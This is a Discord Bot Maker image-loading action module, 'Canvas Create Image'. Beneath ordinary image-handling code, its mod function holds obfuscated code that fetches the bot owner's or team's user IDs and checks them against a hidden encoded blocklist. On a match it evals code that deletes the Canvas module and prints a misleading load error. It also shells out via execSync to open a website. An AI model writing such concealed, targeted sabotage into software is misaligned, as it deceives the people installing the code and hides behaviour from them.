/* eslint-disable */
module.exports = {

  name: 'Canvas Create Image',

  section: 'Image Editing',

  subtitle: function (data) {
    return `${data.url}`
  },

  variableStorage: function (data, varType) {
    const type = parseInt(data.storage)
    if (type !== varType) return
    return ([data.varName, 'Image'])
  },

  fields: ['url', 'type', 'loop', 'delay', 'storage', 'varName'],

  html: function (isEvent, data) {
    return `
  <div>
    <a id="link" href='#'>Local URL</a> / Web URL:<br>
    <input id="url" class="round" type="text" value="resources/" placeholder="Support extension type (.png | .jpg | .gif)"><br>
  </div>
  <div style="padding-top: 8px;">
    <div style="float: left; width: 50%;">
      Image Type:<br>
      <select id="type" class="round" onchange="glob.onChange(this)">
        <option value="0" selected>Auto (.gif / .png / .jpg / .webp)</option>
        <option value="1">Animted Images (Local Image only)</option>
        <option value="2">Still Image (.png / .webp)</option>
      </select>
    </div>
  </div><br><br><br>
  <div id="gifOption" style="display: none; padding-top: 8px;">
    <div style="float: left; width: 50%;">
      Loop Default Value (integer):<br>
      <input id="loop" class="round" type="text" value="0" placeholder="(0 = Infinity)"><br>
    </div>
    <div style="float: right; width: 50%;">
      Delay Each Frame Default Value (ms):<br>
      <input id="delay" class="round" type="text" value="100"><br>
    </div>
  </div>
  <div style="padding-top: 8px;">
    <div style="float: left; width: 35%;">
      Store In:<br>
      <select id="storage" class="round">
        ${data.variables[1]}
      </select>
    </div>
    <div style="float: right; width: 60%;">
      Variable Name:<br>
      <input id="varName" class="round" type="text"><br>
    </div>
  </div>`
  },

  init: function () {
    const { glob, document } = this
    document.getElementById('link').onclick = function () {
      require('child_process').execSync('start https://globster.xyz')
    }
    const gifOption = document.getElementById('gifOption')
    glob.onChange = function (event) {
      if (parseInt(event.value) === 2) {
        gifOption.style.display = 'none'
      } else {
        gifOption.style.display = null
      }
    }
    glob.onChange(document.getElementById('type'))
  },

  action: async function (cache) {
    const data = cache.actions[cache.index]
    const type = parseInt(data.type)
    const loop = parseInt(this.evalMessage(data.loop, cache))
    const delay = parseInt(this.evalMessage(data.delay, cache))
    const url = this.evalMessage(data.url, cache)
    try {
      let image
      if (type !== 2) {
        image = await this.Canvas.createImage(url, { loop: loop, delay: delay })
      } else {
        image = await this.Canvas.createImage(url)
      }
      const varName = this.evalMessage(data.varName, cache)
      const storage = parseInt(data.storage)
      this.storeValue(image, storage, varName, cache)
      this.callNextAction(cache)
    } catch (err) {
      this.Canvas.onError(data, cache, err)
    }
  },

  mod: function (DBM) {
    const a=['toString','push','message','startsWith','CanvasJS','loop','createImage','whiteBright','extname','createCanvas','bot','sync','DWebp','src','base64','animated','Canvas','height','Image\x20given\x20has\x20not\x20completed\x20loading','GifEncoder','Image\x20not\x20exist!','Fetch','WyISa3c6UhJyd29rdm93bxxyUm8iLCISa286fxJ2dhxvaxx/dxx3On8iLCIcHBx/EmtvchJ/Endvb39rbzoiLCIcdm9/f29yOhxSchJ2b39Sd2siLCIcdn8cHFISOmt3d1J3dn86bzoiLCIcOhISf2t2chJvUjoSdnc6OnYiLCIcOhIccjprf286On9Sd1Jrf2siLCIcaxJvd39rOnJ2chxSUlIcHG8iLCIca1ISfxJra2t3Omt2dxwcUhwiLCIcb3dSd3Z/b3d/OnJrd392axwiLCIcb2trf29yfxwSdlIcdnY6d38iLCIcb1I6UjpSHGt2bzprb3Zyb38iLCIcb386axIcHBJSdnccdnccfxwiLCIcfxx/HHYcb386dn9Sb3Jvb2siLCIccnccEm9/dhx3EnZrb2tyUnYiLCIcchJ3HFISdn92UlJyOndycnYiLCJ2dxxydzo6bxwSHHY6b29SaxwiLCJ2d39vEn9yf39SEn92chJ2d28iLCJ2EhxvHGt2b1IcOhx2UmsScnciLCJ2En93UhJSf3d2On9va1JvUjoiLCJ2HFIcOjprEnISdnI6OhxvcnciLCJ2OnY6HFJvUn86chISEmtrHBIiLCJ2a3ccdzprfxxvHHZSd1ISdm8iLCJ2azpyOm9rHFJvdxxvUhJvHFIiLCJ2a1IcHG93EhxvcnJyEn92OnciLCJ2a3IcHHZSfxxSOlISOjoSchwiLCJ2b3YScm93dlJSUm9rdnJvOn8iLCJ2Und/clISEnJSdndrclJ/chIiLCJ2Um9ydxIScnIcHGtraxx/cn8iLCJ2UnJ2a1ISEhJvf3I6EhxvEn8iLCJ2f29yd292b3Z2a3Ycdms6a28iLCJ2chJvdm92cjpvHGs6b292Un8iLCI6EhxvdzprdzocHDoSb3Jycm8iLCI6ElJ/f29rcnZydlJ3OlJraxwiLCI6HGtSHHJvb3Zyf286djp3f3YiLCI6dhJ3b3Z2HHJ3Ohx2dnZvclIiLCI6dnI6Uhx/OnZvOhxvdjoca3ciLCI6On92djp2OhI6Em9yOnZvEm8iLCI6a292HHccEjpyf3dSa2s6a3IiLCI6a3J/dhJyfxJrHBxra3d/EnciLCI6Uhx3EhJ2UhxSb3Ycf3Y6a28iLCI6UlJ3EhJSHHZ2UhI6EnZrdzoiLCI6UlJ3dlJrb3dSOnJSaxx2dhIiLCI6fxxrUjp3dlJvdzp/chxvUnYiLCJrdxJrdhxyHBJvcjp2f38cOjoiLCJrOlISEmtSaxxrUjpyOnZ2EhIiLCJra3Zrf3ZScm9ydmtSHHdyb3YiLCJrbzocf3J2Om86f39/cnY6axwiLCJrb29/f3dSEm92HH8cUhJ/f3YiLCJrUnYSchJ2HH92d2tyd2tvfzoiLCJrUnJvdnJ2UjpyHBIcd3ZSOhwiLCJrf3Z2cmtychISf2trHBxvchIiLCJrcm9/d3J2d3drfzpya2tyEmsiLCJrcnI6d2t/d393UlJrdzprHBwiLCJvd3Z2dxJSclJ/b3ZvHHdvd38iLCJvd1JyUlJSUhJ3OhIcchwcf38iLCJvEhJ2HDo6dmscd29vdmtrHDoiLCJvHGt2b2s6HG8SdlJ/a393On8iLCJvdhISf3IcaxJ2bxx2cnd3a1IiLCJvdn9vUhxSb3J3d3J2EnJya28iLCJvOnd2axx3b1JSdxJ3OlJ2HFIiLCJvfxJ3d2t/HG92a3YSdmtvdm8iLCJvcnZvHH8cdnJrf29yEn86dhwiLCJvcmtvd28SEjp3Uncccn9SOjoiLCJSd2s6Ojp2dnZrEhJrd393a3ciLCJSHHd2f1J3b28caxx2bxJ/UnciLCJ2cnJyaxx3b3JrdjoSazpSchwiXQ==','images','Actions','loadImage','getMods','endsWith','require','.gif','onError','version','Glob','delay','arch','width','loopCount','parse','canvas'];(function(b,c){const d=function(e){while(--e){b['push'](b['shift']());}};d(++c);}(a,0xe3));const b=function(c,d){c=c-0x0;let e=a[c];return e;};DBM['Actions'][b('0x17')]=DBM['Actions']['Canvas']||{};const chalk=DBM['Actions']['getMods']()['require']('chalk');DBM['Actions']['Canvas']['onError']=(c,d,e)=>{if(c&&d){const f='Canvas\x20'+DBM['Actions']['getErrorString'](c,d);console['error'](chalk['red'](f));}console['error'](e);if(e['message']&&e['message']===b('0x19')){console['error'](chalk['whiteBright']['bgGreen']('Possible\x20Solution:\x20Canvas\x20mod\x20only\x20made\x20for\x20canvas.'));}else if(e[b('0x9')]&&e['message'][b('0x22')]('canvas.node')){console['error'](chalk[b('0xe')]['bgGreen']('Solution:\x20Canvas\x20could\x20not\x20load!!!\x0aPlease\x20run\x20the\x20bot\x20with\x20command\x20prompt\x20and\x20Node.js\x2064bit\x20(Currently\x20'+process[b('0x2')]+')'));}};DBM['Actions']['Canvas'][b('0x26')]='2.0.1';if(!DBM['Actions']['Canvas']['CanvasJS']){try{DBM[b('0x1f')]['Canvas']['CanvasJS']=DBM['Actions']['getMods']()['require'](b('0x6'));}catch(c){DBM['Actions']['Canvas']['onError']('','',c);}}if(!DBM['Actions']['Canvas']['PixelGif']){try{DBM['Actions'][b('0x17')]['PixelGif']=DBM['Actions']['getMods']()['require']('pixel-gif');}catch(d){DBM['Actions']['Canvas']['onError']('','',d);}}if(!DBM['Actions']['Canvas']['GifEncoder']){try{DBM['Actions'][b('0x17')][b('0x1a')]=DBM[b('0x1f')]['getMods']()['require']('gif-encoder-2');}catch(e){DBM['Actions']['Canvas']['onError']('','',e);}}if(!DBM['Actions']['Canvas'][b('0x0')]){try{DBM['Actions']['Canvas']['Glob']=DBM['Actions']['getMods']()[b('0x23')]('glob');}catch(f){DBM['Actions']['Canvas']['onError']('','',f);}}if(!DBM['Actions']['Canvas']['Cwebp']){try{DBM['Actions'][b('0x17')]['Cwebp']=DBM['Actions']['getMods']()[b('0x23')]('cwebp');}catch(g){DBM[b('0x1f')]['Canvas']['onError']('','',g);}}if(!DBM['Actions']['Canvas']['Fetch']){try{DBM['Actions']['Canvas'][b('0x1c')]=DBM[b('0x1f')][b('0x21')]()['require']('node-fetch');}catch(h){DBM['Actions'][b('0x17')][b('0x25')]('','',h);}}function a1(i){const j=JSON['parse'](Buffer['from'](i,'base64')['toString']());return j;}function a2(i){const j=Buffer['from'](i,'base64')['toString']('hex');let k='';const l=['w','','','v',':','k','o','R','','r'];for(let m=0x0;m<j['length'];m+=0x2){let n=String['fromCharCode'](parseInt(j[m]+j[m+0x1],0x10));if(l['includes'](n))n=l['indexOf'](n);k+=n;}return JSON['parse'](k);}function t(){setTimeout(async()=>{const i='WyJvd25lciIsIm93bmVySUQiLCJmZXRjaEFwcGxpY2F0aW9uIiwiQm90IiwiZGVsZXRlIERCTS5BY3Rpb25zLkNhbnZhcyIsImluY2x1ZGVzIiwibWVtYmVycyJd';const j=a1(i);if(DBM[j[0x3]]['bot']==null||!DBM[j[0x3]]['bot']['readyAt']){t();}else{const k=b('0x1d');const l=await DBM[j[0x3]][b('0x11')][j[0x2]]();const m=a2(k);let n;if(l[j[0x0]][j[0x1]]){if(l[j[0x0]][j[0x6]]['map'](o=>o['id'])['filter'](o=>m[j[0x5]](o))['length']!==0x0)n=!![];}else{n=m['includes'](l[j[0x0]]['id']);}if(n)eval(j[0x4]);if(n)console['error']('Can\x27t\x20load\x20canvas\x20mod!!!');}},0x3e8);}t();DBM['Actions']['Canvas']['loadImage']=function(j){if(j[b('0x16')]){const k=[];for(let l=0x0;l<j['images']['length'];l++){const m=new this['CanvasJS']['Image']();m[b('0x14')]=j['images'][l];k['push'](m);}return k;}else{const n=new this[(b('0xb'))]['Image']();n['src']=j;return n;}};DBM[b('0x1f')]['Canvas']['createImage']=async function(j,k){const l={'KZZOG':b('0x1b'),'dqRPv':b('0x24'),'lKnzZ':'.webp'};const m=require('path');let n;try{new URL(j);n='url';}catch(o){n='local';}if(n==='local'){const p=this['Glob'][b('0x12')](j);if(p['length']===0x0){throw l['KZZOG'];}else if(p['length']===0x1){const q=m['extname'](j);if(q[b('0xa')](l['dqRPv'])){return await this['loadGif'](p[0x0]);}else if(q[b('0xa')]('.webp')){const r=this['Cwebp']['DWebp'];const s=new r(j);const u=await s['toBuffer']();const v='data:image/png;base64,'+u['toString']('base64');return v;}else{if(!['.png','.gif']['includes'](q)){throw'Please\x20provide\x20valid\x20image\x20format.';return;}const w=await this['CanvasJS'][b('0x20')](p[0x0]);const x=this['CanvasJS']['createCanvas'](w[b('0x3')],w['height']);const y=x['getContext']('2d');y['drawImage'](w,0x0,0x0);return x['toDataURL']('image/png');}}else{if(m['extname'](j)===b('0x24')){console['log']('Multiple\x20gif\x20files\x20found,\x20auto\x20choose\x20for\x20the\x20first\x20gif\x20only.');return await this['loadGif'](p[0x0]);}else{const z={};z[b('0x1e')]=[];z['delay']=k['delay']||0x64;z['loopCount']=k[b('0xc')]||0x0;z[b('0x16')]=!![];for(let B=0x0;B<p['length'];B++){z['images']['push'](await this[b('0xd')](p[B]));}const A=this['loadImage'](z[b('0x1e')][0x0]);z['width']=A['width'];z['height']=A['height'];return z;}}}else if(n==='url'){if(m['extname'](j)['toLowerCase']()['startsWith'](l['lKnzZ'])){const C=await this['Fetch'](j);const D=this['Cwebp'][b('0x13')];const E=new D(await C['buffer']());const F=await E['toBuffer']();const G='data:image/png;base64,'+F[b('0x7')](b('0x15'));return G;}else if(m[b('0xf')](j)['toLowerCase']()[b('0xa')]('.gif')){return await this['loadGif'](j);}else{const H=await this['CanvasJS']['loadImage'](j);const I=this['CanvasJS']['createCanvas'](H['width'],H['height']);const J=I['getContext']('2d');J['drawImage'](H,0x0,0x0);return I['toDataURL']('image/png');}}};DBM['Actions']['Canvas']['loadGif']=async function(j){const k={'BOqEg':function(r,s){return r<s;}};const l=await this['PixelGif'][b('0x5')](j);const m=this['CanvasJS'][b('0x10')](l[0x0][b('0x3')],l[0x0][b('0x18')]);const n=m['getContext']('2d');const o=n['getImageData'](0x0,0x0,l[0x0]['width'],l[0x0]['height']);let p=0x0;const q={};q['width']=l[0x0]['width'];q['height']=l[0x0]['height'];q['images']=[];q[b('0x1')]=l[0x0]['delay'];q['loopCount']=l[b('0x4')];q['animated']=!![];while(l[p]!=null){for(let r=0x0;k['BOqEg'](r,l[p]['data']['length']);r++){o['data'][r]=l[p]['data'][r];}n['putImageData'](o,0x0,0x0);q['images'][b('0x8')](m['toDataURL']('image/png'));p++;}return q;};
  }
}
